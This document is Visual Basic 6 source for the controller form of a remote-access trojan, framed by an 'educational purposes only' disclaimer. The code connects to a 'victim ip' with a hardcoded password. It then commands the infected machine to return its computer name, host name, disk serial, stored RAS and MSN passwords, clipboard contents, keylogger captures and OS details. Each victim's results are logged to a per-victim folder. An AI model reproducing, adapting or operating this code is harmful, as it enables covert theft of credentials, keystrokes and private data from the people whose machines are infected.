VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form11 
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   1  'Fixed Single
   ClientHeight    =   2040
   ClientLeft      =   73410
   ClientTop       =   1.48650e5
   ClientWidth     =   5250
   Icon            =   "client.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   2040
   ScaleWidth      =   5250
   StartUpPosition =   1  'CenterOwner
   Visible         =   0   'False
   Begin VB.TextBox victimip 
      Height          =   645
      Left            =   120
      TabIndex        =   1
      Text            =   "victim ip"
      Top             =   1320
      Width           =   5055
   End
   Begin VB.TextBox Text2 
      BackColor       =   &H00FFFFFF&
      ForeColor       =   &H00FFFFFF&
      Height          =   675
      Left            =   120
      MultiLine       =   -1  'True
      TabIndex        =   0
      Top             =   480
      Width           =   5055
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Line Line5 
      X1              =   0
      X2              =   0
      Y1              =   0
      Y2              =   3240
   End
End
Attribute VB_Name = "Form11"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!


Option Explicit
'for sleep function
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)



Dim reply As String


Private Sub Form_Load()


    With Winsock1
        .Protocol = sckUDPProtocol
        .RemotePort = 50077
        .Bind
    End With
    

End Sub

'check if file exit
Private Function FileExistsWithDir(ByVal FileName As String)
Dim file_name As String

    On Error Resume Next
    file_name = Dir$(FileName)
    FileExistsWithDir = (file_name <> "")
End Function

'text2 changes when receiving results from victim
Private Sub Text2_Change()
    
    Dim file_exists As Boolean
    
    
    If Text2.Text = "Connected" Then
        
        If Form2.Check5.Value = 1 Then
            Call PlaySoundResource(104)
        End If
    
        Dim pcname, hostname, folder, hserial, victimcode As String
        Dim allinfo As String
          
         
        'change colors
        Form1.Picture1.BackColor = &HFF&
        
        Form1.ProgressBar1.Value = Form1.ProgressBar1.Value + 1
        
       
        Text2.Text = ""
        Form1.Text7 = 1
        ' Wait (5)
        'wait dont hang the gui
        Call Form11.GotoSleep(5, 1)
        Form1.logit "Getting computer name from " & victimip.Text
        Winsock1.SendData "compname"
         ' Wait (5)
        'wait dont hang the gui
        Call Form11.GotoSleep(5, 1)
        pcname = Text2.Text
        Form1.ProgressBar1.Value = Form1.ProgressBar1.Value + 1
        
        Text2.Text = ""
         ' Wait (5)
        'wait dont hang the gui
        Call Form11.GotoSleep(5, 1)
        Form1.logit "Getting Host Name from " & victimip.Text
        Text2.Text = ""
        Winsock1.SendData "getmehost"
         ' Wait (5)
        'wait dont hang the gui
        Call Form11.GotoSleep(5, 1)
        hostname = Text2
        Form1.ProgressBar1.Value = Form1.ProgressBar1.Value + 1
        
        
        
        Text2.Text = ""
         ' Wait (5)
        'wait dont hang the gui
        Call Form11.GotoSleep(5, 1)
        Form1.logit "Getting Hdisk serial from " & victimip.Text
        Text2.Text = ""
        Winsock1.SendData "hserial"
         ' Wait (5)
        'wait dont hang the gui
        Call Form11.GotoSleep(5, 1)
        hserial = Text2
        Form1.ProgressBar1.Value = Form1.ProgressBar1.Value + 1
        
        
        'get victim code
        Text2.Text = ""
         ' Wait (5)
        'wait dont hang the gui
        Call Form11.GotoSleep(5, 1)
        Form1.logit "Getting version code " & victimip.Text
        Text2.Text = ""
        Winsock1.SendData "getver"
         ' Wait (5)
        'wait dont hang the gui
        Call Form11.GotoSleep(5, 1)
        victimcode = Trim(Text2)
        Form1.ProgressBar1.Value = Form1.ProgressBar1.Value + 1
        
               
        If victimcode = "" Then
            victimcode = "old victims"
        End If
        
        
        'set string with all info
        allinfo = "\" & victimcode & "-" & pcname & "-" & hostname & "-" & hserial
      
        
        If Right(Form2.Text11.Text, 1) = "\" Then
            
            On Error Resume Next
            MkDir Form2.Text11.Text & victimcode
            On Error Resume Next
            MkDir Form2.Text11.Text & victimcode & "\" & pcname & " " & hostname & "_" & hserial
            folder = Form2.Text11.Text & victimcode & "\" & pcname & " " & hostname & "_" & hserial
        
       Else
        
            On Error Resume Next
            MkDir Form2.Text11.Text & "\" & victimcode
            On Error Resume Next
            MkDir Form2.Text11.Text & "\" & victimcode & "\" & pcname & " " & hostname & "_" & hserial
            folder = Form2.Text11.Text & "\" & victimcode & "\" & pcname & " " & hostname & "_" & hserial
                
        End If
        
        
        Form1.ProgressBar1.Value = Form1.ProgressBar1.Value + 1
        Form1.logit "Directory " & folder & " created for " & victimip.Text
        Form1.ProgressBar1.Value = Form1.ProgressBar1.Value + 1
       
       'check if file is already there
       file_exists = FileExistsWithDir(folder & allinfo & ".txt")
       If file_exists Then
           
         On Error Resume Next
         Open folder & allinfo & ".txt" For Append As #1
             Print #1, " "
             Print #1, " "
             Print #1, " "
             Print #1, "-------------------------------------------------"
             Print #1, "         Ip Date and Time"
             Print #1, " "
             Print #1, Winsock1.RemoteHostIP & "  " & Date & "   " & Time
         Close #1
        Form1.logit "ip information saved for " & victimip.Text
       Else
       
        On Error Resume Next
         Open folder & allinfo & ".txt" For Output As #1
             Print #1, " "
             Print #1, " "
             Print #1, " "
             Print #1, "-------------------------------------------------"
             Print #1, "         Ip Date and Time"
             Print #1, " "
             Print #1, Winsock1.RemoteHostIP & "  " & Date & "   " & Time
         Close #1
        Form1.logit "ip information saved for " & victimip.Text
        
       
       End If
       'end checking
    
        On Error Resume Next
        Open folder & allinfo & ".txt" For Append As #1
            Print #1, " "
            Print #1, " "
            Print #1, " "
            Print #1, "-------------------------------------------------"
            Print #1, "         computer Name"
            Print #1, " "
            Print #1, pcname
        Close #1
        Form1.logit "Computer name saved for " & victimip.Text
        Form1.ProgressBar1.Value = Form1.ProgressBar1.Value + 1
        
        
        On Error Resume Next
        Open folder & allinfo & ".txt" For Append As #1
            Print #1, " "
            Print #1, " "
            Print #1, " "
            Print #1, "-------------------------------------------------"
            Print #1, "         Host Name"
            Print #1, " "
            Print #1, hostname
        Close #1
        Form1.logit "Host name saved for " & victimip.Text
        Form1.ProgressBar1.Value = Form1.ProgressBar1.Value + 1
        
        
        
        On Error Resume Next
        Open folder & allinfo & ".txt" For Append As #1
            Print #1, " "
            Print #1, " "
            Print #1, " "
            Print #1, "-------------------------------------------------"
            Print #1, "         Hard disk serial"
            Print #1, " "
            Print #1, hserial
        Close #1
        Form1.logit "Hard disk serial saved for " & victimip.Text
        Form1.ProgressBar1.Value = Form1.ProgressBar1.Value + 1
         
        
        
        
        
        
        
        On Error Resume Next
        Open folder & allinfo & ".txt" For Append As #1
            Print #1, " "
            Print #1, " "
            Print #1, " "
            Print #1, "-------------------------------------------------"
            Print #1, "         Victim code"
            Print #1, " "
            Print #1, victimcode
        Close #1
        Form1.logit "Victim code saved for " & victimip.Text
        Form1.ProgressBar1.Value = Form1.ProgressBar1.Value + 1
        
         
              
        
        
         ' Wait (5)
        'wait dont hang the gui
        Call Form11.GotoSleep(5, 1)
        reply = ""
        Winsock1.SendData "msn"
         ' Wait (5)
        'wait dont hang the gui
        Call Form11.GotoSleep(5, 1)
        Open folder & allinfo & ".txt" For Append As #1
            Print #1, " "
            Print #1, " "
            Print #1, " "
            Print #1, "-------------------------------------------------"
            Print #1, "         RAS + MSN passwords"
            Print #1, " "
            Print #1, reply
        Close #1
        Form1.logit "RAS + MSN information saved for " & victimip.Text
        Form1.ProgressBar1.Value = Form1.ProgressBar1.Value + 1
        
         ' Wait (5)
        'wait dont hang the gui
        Call Form11.GotoSleep(5, 1)
        reply = ""
        Winsock1.SendData "copymem"
        Call Form11.GotoSleep(5, 1)
        Open folder & allinfo & ".txt" For Append As #1
            Print #1, " "
            Print #1, " "
            Print #1, " "
            Print #1, "-------------------------------------------------"
            Print #1, "         Saved memory (clipboard)"
            Print #1, " "
            Print #1, reply
        Close #1
        Form1.logit "Clipboard information saved for " & victimip.Text
        Form1.ProgressBar1.Value = Form1.ProgressBar1.Value + 1
        
               
        
         ' Wait (5)
        'wait dont hang the gui
        Call Form11.GotoSleep(5, 1)
        reply = ""
        Winsock1.SendData "keylog"
         ' Wait (5)
        'wait dont hang the gui
        Call Form11.GotoSleep(6, 1)
        Open folder & allinfo & ".txt" For Append As #1
            Print #1, " "
            Print #1, " "
            Print #1, " "
            Print #1, "-------------------------------------------------"
            Print #1, "         keys typed"
            Print #1, " "
            Print #1, reply
        Close #1
        Form1.logit "Keys information saved for " & victimip.Text
        Form1.ProgressBar1.Value = Form1.ProgressBar1.Value + 1
        
        
         ' Wait (5)
        'wait dont hang the gui
        Call Form11.GotoSleep(6, 1)
        reply = ""
        Winsock1.SendData "osinfo"
         ' Wait (5)
        'wait dont hang the gui
        Call Form11.GotoSleep(5, 1)
        Open folder & allinfo & ".txt" For Append As #1
            Print #1, " "
            Print #1, " "
            Print #1, " "
            Print #1, "-------------------------------------------------"
            Print #1, "         Victims operating system"
            Print #1, " "
            Print #1, reply
        Close #1
        Form1.logit "Operating System information saved for " & victimip.Text
        Form1.Timer2.Enabled = True
        Form1.logit "Done with " & victimip.Text
        Form1.logit "--------------------------------------------------"
        Form1.ProgressBar1.Value = Form1.ProgressBar1.Value + 1
        
        
        
        'color
        Form1.Picture1.BackColor = 65280
        Form1.ProgressBar1.Value = 0
         

        
        
    End If
        
   

End Sub








'text box gets victim remote ip
Private Sub victimip_Change()
 If victimip <> "temp" Then
     If Form2.Check2.Value = 1 Then
    
        With Winsock1
            .RemoteHost = victimip.Text
        End With
             
        
        Sleep (2000)
        Form1.logit "Connecting to " & victimip.Text
        
        'send the password
        Winsock1.SendData "cobra2000"
        
     End If
 End If
End Sub



Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)

        
        Text2.Text = ""
        reply = " "
        On Error Resume Next
        Winsock1.GetData reply
        Text2.Text = reply
   
       
End Sub






'for sleep

Public Sub GotoSleep(Seconds As Integer, CheckInterval As Integer)
    Dim EndTime As Date
    EndTime = DateAdd("s", Seconds, Now)


    Do While EndTime > Now
       ' Me.Caption = "Sleeping...."
        Sleep CheckInterval

       On Error Resume Next
        DoEvents
        Loop
      '  Me.Caption = "Awake!"
    End Sub


'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!


